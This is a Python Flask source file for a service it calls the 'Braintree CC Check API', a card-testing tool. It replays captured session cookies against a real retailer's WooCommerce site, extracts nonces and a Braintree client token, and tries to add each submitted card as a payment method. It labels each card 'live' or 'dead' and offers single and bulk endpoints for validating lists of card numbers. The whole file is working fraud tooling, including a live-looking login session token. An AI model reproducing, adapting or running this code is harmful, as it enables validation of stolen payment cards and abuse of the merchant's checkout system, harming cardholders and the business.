from flask import Flask, request, jsonify
import requests
import json
import time
import uuid
import random
import string
import base64
import re

app = Flask(__name__)

def generate_random_string(length=10):
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

def braintree_check(ccn, mm, yy, cvc):
    """Complete Braintree CC Check - Returns 'live' or 'dead'"""
    
    start_time = time.time()
    
    if len(yy) == 2:
        yy = '20' + yy

    # Braintree Cookies
    cookies = {
        'sbjs_migrations': '1418474375998%3D1',
        'sbjs_current_add': 'fd%3D2025-10-24%2007%3A53%3A10%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.tea-and-coffee.com%2F%7C%7C%7Crf%3D%28none%29',
        'sbjs_first_add': 'fd%3D2025-10-24%2007%3A53%3A10%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.tea-and-coffee.com%2F%7C%7C%7Crf%3D%28none%29',
        'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'woocommerce_current_currency': 'GBP',
        '_ga': 'GA1.1.1754434682.1761294191',
        'mcforms-38097157-sessionId': '"1ffbebf3-763e-404c-ab5d-33ca3aec32e5"',
        'nitroCachedPage': '0',
        '_fbp': 'fb.1.1761294201465.851852551288875086',
        'mailchimp.cart.current_email': 'zerotracehacked@gmail.com',
        'mailchimp.cart.previous_email': 'zerotracehacked@gmail.com',
        'mailchimp_user_email': 'zerotracehacked%40gmail.com',
        'wordpress_logged_in_ed6aaaf2a4c77ec940184ceefa0c74db': 'zerotracehacked%7C1762503817%7CaPBZvZMKNQ39GNn6YaincgHL96FZPoH69UyIsu5F66y%7Cbe20b116ad3799035f20dbfa310b806ab10c0ea58309c84edbb4bcc42d7d7e4b',
        '_gcl_au': '1.1.1617797498.1761294192.1113548739.1761294203.1761294303',
        'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%206.0%3B%20Nexus%205%20Build%2FMRA58N%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F141.0.0.0%20Mobile%20Safari%2F537.36',
        'sbjs_session': 'pgs%3D12%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.tea-and-coffee.com%2Faccount%2Fadd-payment-method-custom',
        '_ga_81KZY32HGV': 'GS2.1.s1761294191$o1$g1$t1761296133$j51$l0$h1737138817',
        '_ga_0YYGQ7K779': 'GS2.1.s1761294191$o1$g1$t1761296134$j50$l0$h982637675',
    }

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'max-age=0',
        'priority': 'u=0, i',
        'referer': 'https://www.tea-and-coffee.com/account/add-payment-method-custom',
        'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36',
    }

    try:
        # Step 1: Get page and extract nonces
        page_response = requests.get(
            'https://www.tea-and-coffee.com/account/add-payment-method-custom',
            headers=headers,
            cookies=cookies,
            timeout=30
        )
        page_response.raise_for_status()
        page_content = page_response.text

        # Extract nonces
        nonce_match = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', page_content)
        if not nonce_match:
            return "dead"

        woocommerce_nonce = nonce_match.group(1)

        client_nonce_match = re.search(r'client_token_nonce":"([^"]+)"', page_content)
        if not client_nonce_match:
            return "dead"

        client_nonce = client_nonce_match.group(1)

        # Step 2: Get client token
        token_payload = {
            'action': 'wc_braintree_credit_card_get_client_token',
            'nonce': client_nonce,
        }

        token_response = requests.post(
            'https://www.tea-and-coffee.com/wp-admin/admin-ajax.php',
            headers=headers,
            cookies=cookies,
            data=token_payload,
            timeout=30
        )
        token_response.raise_for_status()
        token_data = token_response.json()

        if not token_data.get('success'):
            return "dead"

        client_token_encoded = token_data.get('data')
        if not client_token_encoded:
            return "dead"

        # Decode client token
        client_token_decoded = json.loads(base64.b64decode(client_token_encoded))
        authorization_fingerprint = client_token_decoded.get('authorizationFingerprint')

        # Step 3: Tokenize credit card
        session_id = str(uuid.uuid4())
        braintree_headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Braintree-Version': '2018-05-10',
            'Authorization': f'Bearer {authorization_fingerprint}'
        }

        tokenize_payload = {
            "clientSdkMetadata": {
                "source": "client",
                "integration": "custom",
                "sessionId": session_id,
            },
            "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token } }",
            "variables": {
                "input": {
                    "creditCard": {
                        "number": ccn,
                        "expirationMonth": mm,
                        "expirationYear": yy,
                        "cvv": cvc,
                    },
                    "options": {
                        "validate": False,
                    },
                },
            },
        }

        tokenize_response = requests.post(
            'https://payments.braintree-api.com/graphql',
            headers=braintree_headers,
            json=tokenize_payload,
            timeout=30
        )
        tokenize_response.raise_for_status()
        tokenize_data = tokenize_response.json()

        if 'errors' in tokenize_data:
            return "dead"

        payment_token = tokenize_data['data']['tokenizeCreditCard']['token']

        # Step 4: Add payment method
        form_headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.tea-and-coffee.com',
            'pragma': 'no-cache',
            'priority': 'u=0, i',
            'referer': 'https://www.tea-and-coffee.com/account/add-payment-method-custom',
            'sec-ch-ua': '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0',
        }

        card_type = "visa" if ccn.startswith("4") else "mastercard" if ccn.startswith("5") else "discover"

        form_data = {
            'payment_method': 'braintree_credit_card',
            'wc-braintree-credit-card-card-type': card_type,
            'wc-braintree-credit-card-3d-secure-enabled': '',
            'wc-braintree-credit-card-3d-secure-verified': '',
            'wc-braintree-credit-card-3d-secure-order-total': '20.78',
            'wc_braintree_credit_card_payment_nonce': payment_token,
            'wc_braintree_device_data': '',
            'wc-braintree-credit-card-tokenize-payment-method': 'true',
            'woocommerce-add-payment-method-nonce': woocommerce_nonce,
            '_wp_http_referer': '/account/add-payment-method-custom',
            'woocommerce_add_payment_method': '1',
        }

        payment_response = requests.post(
            'https://www.tea-and-coffee.com/account/add-payment-method-custom',
            headers=form_headers,
            cookies=cookies,
            data=form_data,
            timeout=30
        )

        response_text = payment_response.text

        # FINAL STATUS CHECK - BAS 2 OPTIONS
        if 'Nice! New payment method added' in response_text or 'Payment method successfully added.' in response_text:
            return "live"  # ✅ CARD APPROVED
        else:
            return "dead"  # ❌ CARD DEAD

    except Exception as e:
        return "dead"

# API ENDPOINTS
@app.route('/check', methods=['GET'])
def check_cc_single():
    try:
        cc_data = request.args.get('cc')
        
        if not cc_data:
            return jsonify({'error': 'Missing cc parameter'}), 400
        
        parts = cc_data.split('|')
        if len(parts) != 4:
            return jsonify({'error': 'Invalid format. Use: cc|mm|yy|cvv'}), 400
        
        ccn, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
        
        status = braintree_check(ccn, mm, yy, cvv)
        
        return jsonify({
            'card': f"{ccn[:6]}******{ccn[-4:]}",
            'status': status,
            'timestamp': time.time()
        })
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/bulk', methods=['GET'])
def check_cc_bulk():
    try:
        cards_param = request.args.get('cards')
        
        if not cards_param:
            return jsonify({'error': 'Missing cards parameter'}), 400
        
        cards_list = cards_param.split(',')
        results = []
        
        for card_data in cards_list:
            parts = card_data.split('|')
            if len(parts) == 4:
                ccn, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
                status = braintree_check(ccn, mm, yy, cvv)
                
                results.append({
                    'card': f"{ccn[:6]}******{ccn[-4:]}",
                    'status': status
                })
        
        return jsonify({
            'total_cards': len(results),
            'live_cards': len([r for r in results if r['status'] == 'live']),
            'dead_cards': len([r for r in results if r['status'] == 'dead']),
            'results': results
        })
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/', methods=['GET'])
def home():
    return jsonify({
        'message': 'Braintree CC Check API - By @K4LNX', 
        'status': 'active',
        'endpoints': {
            'single_check': '/check?cc=4111111111111111|12|2026|123',
            'bulk_check': '/bulk?cards=4111111111111111|12|2026|123,5111111111111111|03|2025|456'
        }
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
